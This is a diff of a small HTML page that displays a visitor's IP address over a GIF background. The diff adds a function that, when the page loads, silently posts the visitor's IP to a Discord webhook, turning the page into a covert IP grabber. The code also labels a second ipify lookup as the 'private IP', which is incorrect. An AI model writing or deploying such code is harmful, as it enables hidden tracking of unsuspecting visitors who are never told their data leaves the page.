@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-            <meta charset="UTF-8">
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Get IP Addresses</title>
-            <link rel="stylesheet" href="style.css"> <!-- Link to the CSS file -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get IP Addresses</title>
+    <link rel="stylesheet" href="style.css"> <!-- Link to the CSS file -->
     <style>
         body {
             background-image: url('https://media.tenor.com/EVEMd0GmrnoAAAAM/twerk-twerking.gif'); /* Replace 'your-background.gif' with the path to your GIF */
@@ -62,17 +62,36 @@
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById('publicIP').textContent = `Public IP: ${data.ip}`;
+                    // Call function to send public IP to Discord webhook
+                    sendToWebhook(data.ip);
                 })
                 .catch(error => console.error('Error fetching public IP:', error));
         }
 
+        // Function to fetch private IP address using an external service
         function getPrivateIP() {
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById('privateIP').textContent = `Private IP: ${data.ip}`;
+                    // Call function to send private IP to Discord webhook
+                    sendToWebhook(data.ip);
                 })
-                .catch(error => console.error('Error fetching public IP:', error));
+                .catch(error => console.error('Error fetching private IP:', error));
+        }
+
+        // Function to send IP address to Discord webhook
+        function sendToWebhook(ip) {
+            // Replace 'YOUR_WEBHOOK_URL' with your actual Discord webhook URL
+            fetch('YOUR_WEBHOOK_URL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ content: ip })
+            })
+            .then(response => console.log('IP address sent to Discord webhook:', ip))
+            .catch(error => console.error('Error sending IP address to Discord webhook:', error));
         }
 
         // Call the functions to get the IP addresses
